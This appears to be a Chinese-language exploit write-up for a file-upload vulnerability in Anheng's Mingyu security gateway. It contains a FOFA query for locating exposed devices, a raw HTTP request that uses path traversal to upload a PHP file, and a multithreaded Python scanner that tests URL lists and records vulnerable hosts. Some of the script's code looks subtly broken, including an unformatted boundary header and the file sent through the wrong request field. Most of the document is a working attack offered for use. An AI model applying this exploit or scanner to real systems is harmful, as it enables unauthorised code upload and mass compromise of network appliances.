### fofa

```markdown
title=="明御安全网关"
```

### payload

```markdown
POST /webui/?g=aaa_local_web_preview&name=123&read=0&suffix=/../../../test.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: multipart/form-data; boundary=849978f98abe41119122148e4aa65b1a
Accept-Encoding: gzip
Content-Length: 196

--849978f98abe41119122148e4aa65b1a
Content-Disposition: form-data; name="123"; filename="test.php"
Content-Type: text/plain

This page has a vulnerability
--849978f98abe41119122148e4aa65b1a--
```

![image-20240909211336176](https://fhc-1328696168.cos.ap-beijing.myqcloud.com/image-20240909211336176.png)

拼接访问

```markdown
/test.php
```

![image-20240909211421298](https://fhc-1328696168.cos.ap-beijing.myqcloud.com/image-20240909211421298.png)



### 命令

```markdown
python3 脚本文件名 -u url			  # 测试单个url
python3 脚本文件名 -f url.txt          # 测试多个url
```

### poc

```python
import sys,requests,time,argparse
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
GREEN = '\033[92m'  # 输出颜色
RESET = '\033[0m'

def banner():
    test = """
   
██   ██ ██    ██ ██      ██      ███████ ███████ ███████        ██████   █████  ████████ 
██   ██ ██    ██ ██      ██      ██      ██      ██            ██    ██ ██   ██    ██    
███████ ██    ██ ██      ██      █████   ███████ ███████ █████ ██    ██ ███████    ██    
██   ██ ██    ██ ██      ██      ██           ██      ██       ██    ██ ██   ██    ██    
██   ██  ██████  ███████ ███████ ███████ ███████ ███████        ██████  ██   ██    ██    
                                                                                         
                                                    data: 2024-09-09
                                                    version: 1.0
                                                    author: hulless-oat
"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description='安恒明御安全网关存在文件上传漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='Please input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='File Path')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")

def poc(target,boundary="--849978f98abe41119122148e4aa65b1a"):
    payload = '/webui/?g=aaa_local_web_preview&name=123&read=0&suffix=/../../../test.php'
    url = target + payload
    headers = {
        'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15',
        'Content-Type':'multipart/form-data; boundary={boundary}',
        'Accept-Encoding':'gzip',
        'Content-Length':'200',
    }
    data = {
        '123': ('test.php', '<?php print("This page has a vulnerability"); ?>', 'text/plain')
    }

    try:
        res = requests.post(url=url, headers=headers, data=data, timeout=5,verify=False)
        # print(res.status_code)
        if "success" in res.text:
            payload1 = '/test.php'
            url1 = target + payload1
            res1 = requests.get(url=url1,verify=False)
            if "This page has a vulnerability" in res1.text:
                print(f"[+]{GREEN}该网站存在文件上传漏洞：{RESET}{target}")
                with open("result.txt", "a", encoding="utf-8") as f:
                    f.write(target + '\n')
        else:
            print(f"[-]该网站不存在文件上传漏洞")

    except Exception as e:
        print(f"[*]该网站无法访问")

if __name__ == '__main__':
    main()
```

